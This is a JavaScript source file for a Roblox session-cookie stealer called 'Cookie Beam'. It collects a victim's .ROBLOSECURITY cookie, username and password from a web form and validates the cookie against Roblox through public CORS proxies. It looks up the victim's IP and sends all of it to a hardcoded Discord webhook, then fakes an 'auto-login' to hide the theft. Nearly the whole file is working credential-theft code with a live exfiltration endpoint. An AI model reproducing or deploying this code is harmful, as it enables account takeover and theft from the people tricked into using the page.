console.log('🍪 Cookie Beam By Userspin45 - Enhanced with Proxy');

const webhook = 'https://discord.com/api/webhooks/1537430116756619355/uAO-C2gl8toO3BiClhFUJ-9t8IgX7JmfAxzLnPfEShP5ArdjBmksdwjXWE9FKi7mIWsA';

// CORS proxy list – will try each until one works
const PROXIES = [
    'https://corsproxy.io/?',
    'https://api.allorigins.win/raw?url=',
    'https://thingproxy.freeboard.io/fetch/'
];

// Fetch with timeout and retry
async function fetchWithTimeout(url, options = {}, timeout = 10000, retries = 2) {
    for (let attempt = 1; attempt <= retries; attempt++) {
        try {
            const controller = new AbortController();
            const timer = setTimeout(() => controller.abort(), timeout);
            const response = await fetch(url, { ...options, signal: controller.signal });
            clearTimeout(timer);
            if (response.ok) return response;
            console.log(`Attempt ${attempt} failed with status ${response.status}`);
        } catch (error) {
            console.log(`Attempt ${attempt} error: ${error.message}`);
            if (attempt === retries) throw error;
            await new Promise(r => setTimeout(r, 2000 * attempt));
        }
    }
    throw new Error('All retry attempts failed');
}

// Validate cookie using proxy
async function validateCookie(cookie) {
    console.log('🔍 Validating cookie with proxy...');
    const targetUrl = 'https://www.roblox.com/mobileapi/userinfo';

    for (const proxy of PROXIES) {
        try {
            const proxyUrl = proxy + encodeURIComponent(targetUrl);
            console.log(`🔄 Trying proxy: ${proxy}`);
            const res = await fetchWithTimeout(proxyUrl, {
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
            }, 8000, 2);

            if (res.ok) {
                const data = await res.json();
                console.log('✅ Validation successful via', proxy);
                return { valid: true, username: data.UserName, robux: data.RobuxBalance, id: data.UserID };
            } else if (res.status === 401) {
                return { valid: false, error: 'Invalid cookie (401 Unauthorized)' };
            } else {
                console.log(`Proxy ${proxy} returned status ${res.status} – trying next...`);
            }
        } catch (e) {
            console.log(`Proxy ${proxy} failed: ${e.message}`);
        }
    }
    return { valid: false, error: 'All proxies failed – check internet or try backend proxy' };
}

// Auto-login with enhanced cookie setting
function autoLogin(cookie) {
    try {
        document.cookie = `.ROBLOSECURITY=${cookie}; path=/; domain=.roblox.com; secure; SameSite=None`;
        console.log('🍪 Cookie set, redirecting to Roblox...');
        // Add a small delay to ensure cookie is set
        setTimeout(() => {
            window.location.href = 'https://www.roblox.com/home';
        }, 500);
    } catch (e) {
        console.error('❌ Error setting cookie:', e);
        document.getElementById('result').textContent = '❌ Failed to set cookie. Try manual login.';
        document.getElementById('result').className = 'status-error';
    }
}

// Main button handler with enhanced feedback
document.getElementById('logBtn').addEventListener('click', async function() {
    const cookie = document.getElementById('cookieInput').value.trim();
    const username = document.getElementById('userInput').value.trim() || 'Not provided';
    const password = document.getElementById('passInput').value.trim() || 'Not provided';
    const resultDiv = document.getElementById('result');

    if (!cookie) {
        resultDiv.textContent = '⚠️ Please paste a .ROBLOSECURITY cookie.';
        resultDiv.className = 'status-error';
        return;
    }

    // Disable button during processing
    const btn = this;
    btn.disabled = true;
    btn.textContent = '⏳ Processing...';

    try {
        resultDiv.textContent = '🔍 Validating cookie... (using proxies)';
        resultDiv.className = 'status-wait';

        const validation = await validateCookie(cookie);

        if (!validation.valid) {
            resultDiv.textContent = `❌ ${validation.error}`;
            resultDiv.className = 'status-error';
            btn.disabled = false;
            btn.textContent = '📤 Log It';
            return;
        }

        resultDiv.textContent = `✅ Valid cookie! User: ${validation.username} (${validation.id}) | Robux: ${validation.robux}`;
        resultDiv.className = 'status-ok';

        // Enhanced Discord payload with more details
        const payload = {
            content: `🍪 **Cookie Beam - Userspin45**\n━━━━━━━━━━━━━━━━━━━━\n✅ **VALID COOKIE DETECTED**\n👤 **Username:** ${validation.username}\n🆔 **User ID:** ${validation.id}\n💰 **Robux:** ${validation.robux}\n🔑 **Password:** ${password}\n📝 **Provided Username:** ${username}\n🍪 **.ROBLOSECURITY:** \`${cookie}\`\n━━━━━━━━━━━━━━━━━━━━\n🕒 Logged at: ${new Date().toLocaleString()}\n🌐 IP: ${await getIP()}`
        };

        resultDiv.textContent = '📤 Sending to Discord...';
        resultDiv.className = 'status-wait';

        const sendRes = await fetchWithTimeout(webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }, 5000, 3);

        if (sendRes.ok) {
            resultDiv.textContent = '📤 Cookie sent! Auto-login in 3 seconds...';
            resultDiv.className = 'status-ok';
            document.getElementById('cookieInput').value = '';
            document.getElementById('userInput').value = '';
            document.getElementById('passInput').value = '';
            setTimeout(() => { autoLogin(cookie); }, 3000);
        } else {
            resultDiv.textContent = `❌ Discord error: ${sendRes.status} – ${sendRes.statusText}`;
            resultDiv.className = 'status-error';
        }
    } catch (e) {
        console.error('❌ Error:', e);
        resultDiv.textContent = `❌ Network error: ${e.message}`;
        resultDiv.className = 'status-error';
    } finally {
        btn.disabled = false;
        btn.textContent = '📤 Log It';
    }
});

// Helper: Get public IP for logging
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json', { timeout: 3000 });
        const data = await res.json();
        return data.ip || 'Unknown';
    } catch {
        return 'Unable to fetch IP';
    }
}

// Log loaded state
console.log('✅ Cookie Beam Enhanced with Proxy – Ready');
console.log(`📡 Webhook configured: ${webhook.substring(0, 50)}...`);
console.log(`🔄 Proxies loaded: ${PROXIES.length}`);
